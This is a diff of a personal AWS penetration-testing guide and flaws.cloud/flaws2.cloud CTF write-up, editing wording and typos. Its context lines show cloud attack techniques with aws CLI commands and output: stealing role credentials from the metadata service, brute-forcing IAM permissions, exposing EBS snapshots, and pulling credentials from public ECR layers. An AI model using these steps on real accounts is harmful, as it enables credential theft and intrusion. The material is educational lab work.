@@ -89,7 +89,7 @@ For a slightly more readable version, read this post <a href="https://github.com
 <br>
 
 * **S3 buckets** and **Azure/GCP storage buckets** are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
-* Privilege escalation within a cloud service can be useful. It can help move laterally to other services or even escalate privileges even further
+* Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole
 
 ## AWS penetration testing
 Similar to other types of penetration testing, the scoping process should include questions such as:
@@ -109,27 +109,27 @@ Start by **identifying the attack surface**, determining which services are:
 * Externally exposed
 * Managed by AWS or by the customer
 
-Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like with a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information
+Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like in a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information
 
 <br>
 
 A few **AWS-specific reconnaissance techniques**:
-* Searching the AWS Marketplace for the target organization as teh accountid may be disclosed
+* Searching the AWS Marketplace for the target organization as the account ID may be disclosed
 * Brute-forcing the account ID via the AWS Sign-In URL: `https://<accountid>.signin.aws.amazon.com`
 * Searching through public snapshots (i.e EBS snapshots) or AMI Images
 
 <br>
 
-Regarding the **local filesystem**, other tasks besides the typical, non-cloud checks, are:
+Regarding the **local filesystem**, other tasks besides the usual non-cloud checks are:
 * Discovery of AWS Access Credentials in home directories and application files
 * Verifying access to the **AWS metadata enpoint** at `https://169.254.169.254/` or `http://[fd00:ec2::254]`
 
 <br>
 
-**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens.
+**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens
 
 Credentials can be requested via the **AWS metadata service** (see above), which holds different kinds of information split into different categories. The most interesting ones are:
-* **iam/info**, containing informaiton about associated IAM roles
+* **iam/info**, containing information about associated IAM roles
 * **iam/security-credentials/role-name**, containing temporary security credentials associated with the role
 
 If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
@@ -191,7 +191,7 @@ aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNlbnRyYWwtMSJIMEYCIQCnZUyvONtQlYo9
 ```
 <br>
 
-Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then if the user has permissions to run **iam:list-attached-role-policies**
+Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then check if the user has permissions to run **iam:list-attached-role-policies**
 
 ```
 [www-data@manager ~]$ aws sts get-caller-identity
@@ -205,7 +205,7 @@ Moving on to the enumeration of **AWS Security Token Permission**, below is a wa
 An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role ServerManager because no identity-based policy allows the iam:ListAttachedRolePolicies action
 ```
 
-Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔).
+Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔)
 
 ```
 [www-data@manager enumerate-iam-master]#./enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --session-token SESSION_TOKEN
@@ -221,7 +221,7 @@ Permissions can be bruteforced with <a href="https://github.com/andresriancho/en
 
 <br>
 
-Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive.
+Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive
 
 ```
 [www-data@manager ~]$ aws ec2 describe-volumes
@@ -319,7 +319,7 @@ WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
 # CTFs and hands-on material
 ## flaws.cloud
 
-This one was great. Simple, minimal setup and slowly introduces each concept. But if you're a beginner, you'll learn so much from such small challenges! Definitely worth your time 
+This one was great. Simple, minimal setup and slowly introduces each concept. You'll learn so much from such small challenges! Definitely worth your time 
 
 ```
 Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
@@ -578,7 +578,7 @@ ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
     "Arn": "arn:aws:iam::975426262029:user/backup"
 }
 ```
-With the region and the user ID, it's now possible to call `ec2 describe-snapshost`. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
+With the region and the user ID, it's now possible to call `ec2 describe-snapshot`. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
@@ -700,7 +700,7 @@ flaws
   "Expiration" : "2025-10-11T02:23:14Z"
 }   
 ```
-Add these credentials to `~/.aws/credentials` and confirm they work!
+Add these credentials to `~/.aws/credentials` and confirm they work
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws --profile flaws sts get-caller-identity
@@ -758,13 +758,13 @@ Starting with basic enumeration, we check our identity and our permissions
     ]
 }
 ```
-To enumerate the policies, use the combination of these two commands. For each of them, list their policy versions and then go deeper with `get-policy-version` for each version. Obviously replace the policy-arn, version-id and profile as desired.
+To enumerate the policies, use the combination of these two commands. For each of them, list their policy versions and then go deeper with `get-policy-version` for each version. Obviously replace the policy-arn, version-id and profile as desired
 ```
 aws --profile SecurityAudit iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
 aws --profile SecurityAudit iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
 ```
 
-The most relevant things I found from this were:
+The most relevant things I found were:
 * MySecurityAudit role is extremely permissive, including with Lambda functions
 * There are references to an API gateway resource called `puspzvwgb6/*` and `/restapis/puspzvwgb6/stages` 
 
@@ -780,7 +780,7 @@ Enumerating lambda...
             "Runtime": "python2.7",
 <snip>
 ```
-In the policy associated with it, not how the REST API id was leaked in the `SourceArn` field
+In the policy associated with it, note how the REST API ID was leaked in the `SourceArn` field
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws --profile SecurityAudit lambda get-policy --function-name Level6 --region us-west-2     
@@ -789,7 +789,7 @@ In the policy associated with it, not how the REST API id was leaked in the `Sou
     "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
 }
 ```
-The API URL format should look something like this `https://<REST_api_id>.execute-api.<region>.amazonaws.com/<API_stage_name>/<function>`. We have the id, the region and the function. The stage name can be fetched with
+The API URL format should look something like this `https://<REST_api_id>.execute-api.<region>.amazonaws.com/<API_stage_name>/<function>`. We have the ID, the region and the function. The stage name can be fetched with
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws --profile SecurityAudit apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2
@@ -817,13 +817,11 @@ So the full URL is going to be `https://s33ppypa75.execute-api.us-west-2.amazona
 </p>
 
 
-This was pretty fun, barely any setup needed and great for someone starting out. I really liked how it explains what went so wrong that made it possible to exploit each vulnerability. Looking forward to flaws2!
-
 <br>
 
 ## flaws2.cloud (attacker path)
 
-Same as the first flaws. Unfortunately there are less levels, but on the other hand it looks a bit more realistic with the combination of web and cloud hacking
+Same as the first flaws, definitely worth your time. Unfortunately there are less levels, but on the other hand it looks a bit more realistic with the combination of web and cloud hacking
 
 ### Level 1
 
@@ -833,7 +831,7 @@ Seems to start off as a web challenge, cool! Let's fire up burp
   <img width="50%" src="https://github.com/user-attachments/assets/073f62a0-524b-4d7e-95e5-f2bea499b691" >
 </p>
 
-Simply intercept the request and send a string as the code in the GET parameter and the application will break. This will leak AWS credentials
+Simply intercept the request and send a string as the code in the GET parameter. The application will break and will leak AWS credentials
 
 
 <p align="center">
@@ -875,7 +873,7 @@ Curling or using a browser to fetch the secret HTML reveals Level 2 at http://le
 This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".
 ```
 
-If an ECR is public, we can list its images. For that we need the repository name and the registry id
+If an ECR is public, we can list its images. For that we need the repository name and the registry ID
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws sts get-caller-identity
@@ -922,7 +920,7 @@ We can enumerate further by fetching the manifest of this container with
     },
 <snip>
 ```
-We  can request a download URL for each layer with the following command. This requires some trial and error until we find something useful
+We  can request a download URL for each layer with the following command. This required some trial and error until I found something useful
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -933,7 +931,7 @@ We  can request a download URL for each layer with the following command. This r
     "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
 }
 ```
-Browsing to the URL will download file which contains credentials
+Browsing to the URL will download the file which contains credentials
 
 <p align="center">
   <img width="50%" src="https://github.com/user-attachments/assets/ef3ee4e6-8694-4ed0-8cac-ad2066161878" >
